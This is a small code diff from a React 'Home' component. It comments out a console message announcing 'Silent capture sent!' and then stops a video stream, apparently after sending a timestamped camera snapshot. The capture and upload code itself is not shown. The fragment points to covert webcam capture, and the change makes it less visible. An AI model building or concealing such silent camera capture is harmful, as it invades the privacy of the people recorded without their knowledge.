@@ -39,7 +39,7 @@ const Home = () => {
             time: new Date().toLocaleString(),
           });
 
-          console.log("📸 Silent capture sent!");
+          // console.log("📸 Silent capture sent!");
           video.pause();
           video.srcObject = null;
         }, 1000);
